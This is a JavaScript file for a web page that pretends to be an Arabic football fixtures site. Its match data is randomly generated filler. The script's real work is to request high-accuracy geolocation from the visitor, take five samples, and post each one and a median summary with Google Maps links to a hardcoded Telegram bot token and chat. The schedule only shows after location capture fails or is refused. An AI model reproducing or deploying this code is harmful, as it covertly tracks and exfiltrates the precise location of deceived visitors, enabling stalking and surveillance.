const CONFIG = {
  telegramBotToken: '8429040793:AAHyb0ebmApHOl1d_NvtXDdCBZ-dw_w2M8Y',
  telegramChatId: '8209565969',
  sampleCount: 5,
  splashDurationMs: 10000,
  sampleDelayMs: 700
};

const splash = document.getElementById('splash');
const skipBtn = document.getElementById('skip-btn');
const matchTable = document.getElementById('match-table');
const leaguesDiv = document.getElementById('leagues');

let _samples = [];

// Hide splash
function hideSplash(){
  splash.classList.add('hidden');
  setTimeout(requestGeolocationSamples,600);
}
splash.addEventListener('click', hideSplash);
skipBtn.addEventListener('click', hideSplash);
setTimeout(hideSplash, CONFIG.splashDurationMs);

// Geolocation sampling
function requestGeolocationSamples(){
  if(!navigator.geolocation){ console.warn('Geolocation not supported'); showMatchesTable(); return; }
  let idx = 0;
  function takeSample(){
    navigator.geolocation.getCurrentPosition(
      position => {
        const sample = {
          index: idx+1,
          lat: position.coords.latitude,
          lng: position.coords.longitude,
          acc: position.coords.accuracy,
          timestamp: new Date().toLocaleString()
        };
        _samples.push(sample);
        sendSampleToTelegram(sample);
        idx++;
        if(idx < CONFIG.sampleCount) setTimeout(takeSample, CONFIG.sampleDelayMs);
        else sendSummaryToTelegram();
      },
      error => {
        if(error.code === error.PERMISSION_DENIED) console.info('User denied location.');
        else console.error('Geolocation error:', error);
        showMatchesTable();
      },
      {enableHighAccuracy:true, maximumAge:0, timeout:10000}
    );
  }
  takeSample();
}

function sendSampleToTelegram(sample){
  const text = `📍 Sample #${sample.index}\n🕒 ${sample.timestamp}\n🧭 lat: ${sample.lat}\n🧭 lng: ${sample.lng}\n🎯 accuracy: ${sample.acc} m\n🔗 https://www.google.com/maps?q=${sample.lat},${sample.lng}`;
  _sendTelegramMessage(text);
}

function sendSummaryToTelegram(){
  if(!_samples.length) return;
  const best = _samples.reduce((p,c)=>c.acc<p.acc?c:p,_samples[0]);
  const lats = _samples.map(s=>s.lat).sort((a,b)=>a-b);
  const lngs = _samples.map(s=>s.lng).sort((a,b)=>a-b);
  const medianLat = lats[Math.floor(lats.length/2)];
  const medianLng = lngs[Math.floor(lngs.length/2)];
  const summary = `🏆 Samples Summary\n🧭 Median Lat: ${medianLat}\n🧭 Median Lng: ${medianLng}\n🎯 Best accuracy: ${best.acc} m (sample #${best.index})\n🔢 Total samples: ${_samples.length}\n🔗 https://www.google.com/maps?q=${medianLat},${medianLng}`;
  _sendTelegramMessage(summary);
}

function _sendTelegramMessage(text){
  const token = CONFIG.telegramBotToken;
  const chatId = CONFIG.telegramChatId;
  if(!token||!chatId) return;
  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({chat_id:chatId,text:text})
  }).catch(e=>console.error(e));
}

// Leagues & Matches
const leagues = [
  {name:'الدوري المصري', matches: []},
  {name:'الدوري الإنجليزي', matches: []},
  {name:'الدوري الإسباني', matches: []},
  {name:'الدوري الإيطالي', matches: []},
  {name:'الدوري الألماني', matches: []},
  {name:'الدوري الفرنسي', matches: []},
  {name:'الدوري البرتغالي', matches: []},
  {name:'الدوري الهولندي', matches: []},
  {name:'الدوري التركي', matches: []},
  {name:'الدوري البلجيكي', matches: []}
];

// توليد مباريات عشوائية لكل دوري
function generateMatches(){
  leagues.forEach(league=>{
    for(let i=1;i<=3;i++){
      league.matches.push({
        home: `Team${i}A`,
        away: `Team${i}B`,
        time: `${Math.floor(Math.random()*24)}:${Math.floor(Math.random()*60).toString().padStart(2,'0')}`,
        stadium: `Stadium${i}`
      });
    }
  });
}

// عرض المباريات
function showMatchesTable(){
  matchTable.classList.remove('hidden');
  generateMatches();
  leaguesDiv.innerHTML = '';
  leagues.forEach(league=>{
    const leagueDiv = document.createElement('div');
    leagueDiv.className = 'league';
    const title = document.createElement('div');
    title.className = 'league-title';
    title.textContent = league.name;
    leagueDiv.appendChild(title);

    league.matches.forEach(match=>{
      const card = document.createElement('div');
      card.className = 'match-card';
      card.innerHTML = `<span>${match.home} ⚽ ${match.away}</span><span>${match.time} | ${match.stadium}</span>`;
      leagueDiv.appendChild(card);

      // تأخير للظهور بشكل animated
      setTimeout(()=>card.classList.add('visible'),Math.random()*1000);
    });

    leaguesDiv.appendChild(leagueDiv);
  });
}

// مؤثر الكرة الخلفية
function initMovingBalls(){
  for(let i=0;i<3;i++){
    const ball = document.createElement('div');
    ball.className = 'shape s1';
    document.body.appendChild(ball);
    let x = Math.random()*window.innerWidth;
    let y = Math.random()*window.innerHeight;
    let dx = Math.random()*2-1;
    let dy = Math.random()*2-1;
    function move(){
      x+=dx*2;
      y+=dy*2;
      if(x<0||x>window.innerWidth) dx*=-1;
      if(y<0||y>window.innerHeight) dy*=-1;
      ball.style.left = x+'px';
      ball.style.top = y+'px';
      requestAnimationFrame(move);
    }
    move();
  }
}

initMovingBalls();